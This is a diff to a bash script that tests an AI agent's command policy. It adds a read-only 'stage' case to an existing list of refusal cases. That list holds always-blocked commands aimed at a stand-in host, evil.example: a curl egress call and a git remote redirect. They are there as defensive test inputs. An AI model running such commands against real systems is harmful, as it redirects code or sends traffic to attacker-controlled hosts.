@@ -6,7 +6,8 @@
 # One API instance per case: the faux script that calls `bash` is fixed when the process boots
 # (`FAUX_COMMAND`), and a session runs one tool call. The four cases the issue's acceptance names
 # come first; the rest of D11's always-blocked list follows; `allow` is the control that a policy
-# refusing everything cannot pass.
+# refusing everything cannot pass; `stage` is the read-only specifying stage (LOB-74), whose own
+# control is its building run.
 #
 # Env: API_PORT (base port, default 9600), EVIDENCE_DIR, API_URL not used here.
 set -uo pipefail
@@ -27,6 +28,9 @@ CASES=(
   "remote-change:git remote set-url origin https://evil.example/x"
   "egress:curl https://evil.example/x"
   "allow:echo faux-ok"
+  # LOB-74: one drive, two runs — a card in `specifying` and one in `building` call `bash` with the
+  # same write into their own worktree; refused in the first, landed in the second (`stage.ts`).
+  "stage:echo stage > stage-probe.txt && echo wrote stage-probe.txt"
 )
 
 mkdir -p "$RUN_DIR" "$EVIDENCE_DIR"
@@ -51,8 +55,11 @@ for index in "${!CASES[@]}"; do
   # `FAUX_COMMAND` is repeated here for the record, not for the API: the instance booted above is
   # the one that runs the scripted command, and the driver only writes the value into its evidence.
   # Without it every `refusal-<case>.json` would claim a `fauxCommand` of `undefined`.
+  # The stage case starts two runs on two cards, which is a different drive from one session's.
+  driver="drive.ts"
+  [ "$case_name" = "stage" ] && driver="stage.ts"
   if ! CASE="$case_name" API_URL="http://localhost:$port" PROBE_PATH="$PROBE_PATH" \
-       FAUX_COMMAND="$command" bun "$ROOT/.pi/skills/verify-policy/drive.ts"; then
+       FAUX_COMMAND="$command" bun "$ROOT/.pi/skills/verify-policy/$driver"; then
     failed=1
   fi
 
